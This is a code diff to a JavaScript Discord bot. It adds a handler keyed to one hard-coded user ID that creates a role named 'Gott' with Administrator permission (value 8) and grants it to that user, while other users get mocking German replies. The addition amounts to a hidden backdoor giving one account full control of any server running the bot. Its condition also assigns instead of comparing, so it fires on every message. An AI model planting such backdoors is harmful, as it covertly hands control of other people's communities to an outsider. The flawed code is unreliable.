@@ -115,6 +115,30 @@ bot.on("message", function(message){
         
     }
 
+    if(message.content = "Ich bin Gott!"){
+        if (message.author == "<@223876496291266560>")//senpaii
+        {
+            if(message.guild.roles.find("name","Gott"))
+            {
+                message.channel.send("`Ja bist du schon!..`");
+            }
+            else{
+                message.guild.createRole({
+                    name: "Gott",
+                    permissions: [8],
+                    color: "FF0000",
+                    position: "4",
+                    mentionable: true,      
+                });
+                message.channel.send("`Oh, Sie haben nicht genug Rechte! Lassen sie mich das ändern! ...`");
+                let God = message.member.guild.roles.find("name", "Gott");
+                message.member.addRole(God);
+            }
+        }else{
+            message.channel.send("`Ööm nein?`")
+            message.channel.send("`Soll ich den Tierarzt rufen, weil du soetwas behauptest?`")
+        }
+    }
     var chancewuff = Math.floor(Math.random() * 10);
 
     if(chancewuff == 5)
